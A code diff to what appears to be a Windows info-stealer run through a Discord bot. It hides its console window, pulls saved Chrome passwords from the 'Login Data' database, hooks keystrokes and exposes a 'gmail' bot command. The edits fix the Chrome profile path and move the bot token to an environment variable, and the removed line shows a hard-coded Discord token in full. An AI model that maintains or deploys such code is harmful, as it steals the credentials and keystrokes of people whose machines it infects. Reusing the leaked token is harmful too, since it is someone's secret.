@@ -17,6 +17,9 @@ import winreg as reg
 import sys
 import signal
 import zipfile
+from dotenv import load_dotenv
+
+load_dotenv()
 
 if sys.platform == "win32": 
     # Hide the console window
@@ -82,7 +85,7 @@ def get_password(user, profile):
     # get the AES key
     key = get_encryption_key()
     # local sqlite Chrome database path
-    db_path = os.path.join(f"d:/{user}", "AppData", "Local",
+    db_path = os.path.join(f"c:/{user}", "AppData", "Local",
                             "Google", "Chrome", "User Data", profile, "Login Data")
     result = ""
     # copy the file to another location
@@ -349,5 +352,7 @@ async def gmail(ctx, *, param: str):
         
 
 keyboard.on_press(on_key_event)    
+
+token = os.getenv('token')
     
-bot.run('MTI3NjIwODYwOTQwNzAxMjk1NQ.GL50-m.3nLBbHr39A1xoLpRtJMAOwBM8Jz2oW8Dv_HCMU') 
+bot.run(token) 
